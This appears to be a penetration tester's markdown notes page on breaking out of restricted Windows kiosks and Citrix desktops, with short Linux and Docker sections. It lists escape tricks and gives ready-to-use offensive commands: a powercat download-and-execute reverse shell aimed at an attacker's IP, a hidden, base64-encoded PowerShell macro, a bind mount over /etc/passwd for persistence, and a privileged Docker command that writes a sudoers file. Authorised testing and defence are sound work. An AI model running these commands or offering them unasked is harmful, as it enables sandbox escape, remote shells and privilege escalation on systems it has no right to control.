---
layout: blank
pagetitle: Kiosk Breakouts
---

Amazing resource: [https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/#dialogboxes](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/#dialogboxes)

Kiosk breakout badusb script: [https://github.com/KhaelK138/badusb-windows-kiosk-breakout/blob/main/breakout_payload.txt](https://github.com/KhaelK138/badusb-windows-kiosk-breakout/blob/main/breakout_payload.txt)

## Windows

**Bypassing Path Restrictions**
- Sometimes, paths like `C:\Windows\` will be restricted, but we can use `%WINDIR%` or `shell:MyComputerFolder` to bypass this
  - More path bypasses can be found in the link at above
- Other protocol handlers, such as `about:`, `data:`, `ftp:`, `mailto:`, `news:`, `res:`, `telnet:`, `snews:`, or `view-source:` can also be an avenue for a breakout
  - [This website](https://www.phrack.me/tools/2022/11/02/Kiosk-Breakout.html) provides links to a lot of these
  - FTP has specific command execution functionality, which can be used to bypass restrictions
    - `ftp` and then `!"{command_to_run}"`, such as `!"dir C:\Windows\System32"`
  - Hell even `calculator://localhost` exists, don't ask me why
  - Same goes for UNC paths, such as `\\127.0.0.1\C$\Windows\System32`

**Getting a Shell**
- Can simply run (Win+R) programs like `cmd`, `powershell`, or `powershell_ISE`
- Can right click and "open" the file
- Can drop another file, like a `.txt`, onto the `cmd` binary
- Can hyperlink to it via a file/web browser (`file:///C:/Windows/System32/cmd.exe` or `file:///C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe`)
- Can place direct commands in `.bat` or `.cmd` files, such as something as simple as `powershell`
  - For a full list of executable file types: [https://aerorock.co.nz/list-of-executable-file-extensions-windows/](https://aerorock.co.nz/list-of-executable-file-extensions-windows/)
- Can run Visual Basic inside a `.vbs` file with the following `set objApp = CreateObject("WScript.Shell"): objApp.Run "powershell"`
- Can simply right-click and say "open in terminal", which can surprisingly work sometimes

**Bypassing Disabled Interactive Sessions**
- If `cmd` is run with `/K` or `/C`, it won't allow for interactive commands
  - This can be bypassed by running `cmd.exe /K pause` or provided a command with `cmd.exe /C {command}`

**Bypassing Name Restrictions**
- It can sometimes be as easy as renaming `cmd.exe` to `mspaint.exe`

**Utilizing Internet Explorer**
- `file://c:\windows\system32\cmd.exe` is always a good shot
- Menus can open up all sorts of functionality
- Right-clicking images (or ctrl+s) can save-as, popping a file dialog
  - `file` > `Customize Internet Explorer view source` > `other` can allow us to set the application to view source as `C:\Windows\System32\cmd.exe`
- Favorites menu (with alt+c) and dragging a folder onto the browser window can work wonders
- Setting homepage to `cmd.exe` can also work
- Browser-based exploits - Metasploit can help host a webpage to exploit Explorer

**Citrix**
- If we can modify the `.ICA` file that Citrix uses as configuration, we can add `InitialProgram=cmd.exe` 

**Breaking out with MS Paint?!?!**
- Create a 6x1 canvas and setting certain pixels can allow us to write batch file code
  - RGB pixels in order: `10 0 0`, `13 10 13`, `100 109 99`, `120 101 46`, `0 0 101`, `0 0 0`
- Then, save as a 24-bit Bitmap and rename to a `.bat` file
- Finally, open the batch file

**MS Office Macros**
- We can often get a powershell Window by creating a `docx` file, opening it, and running a macro
  - To make macros: View -> Macros
  - Basic macro code that opens powershell:
	
```
Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

- Powercat
  - Creates reverse shells, but detected by defender
    - Command to download/execute the reverse shell: `IEX(New-Object System.Net.WebClient).DownloadString('http://{IP}:{port}/powercat.ps1');powercat -c {IP} -p {port} -e powershell`
    - This is just grabbing a hosted powershell script
  - Can be passed to the macro by encoding it in chunks of 50 base64 characters:
    - `Dim Str as String`
    - `Str = Str + "powershell.exe -nop -w hidden -enc {base64}"`
    - `Str = Str + {base64}"`
    - `CreateObject("Wscript.Shell").Run Str`

**LOLBAS**
- Check out the binaries that can execute commands at [https://lolbas-project.github.io/#/execute](https://lolbas-project.github.io/#/execute)

## Linux

**Bypassing Read-Only File Systems**
- If we have a filesystem or directory we can't write to as root, we can try mounting over the directory instead
  - For example, let's say we can't write to `/etc/passwd`, even as root, but we want persistence
  - We can create our own version and put it in `/tmp/passwd` and then run `sudo mount -o bind /tmp/passwd /etc/passwd`
  - Now, anything that reads `/etc/passwd` will read our version, even though actual `/etc/passwd` is unchanged

## Docker

Shai Hulud breakout payload: `docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"`

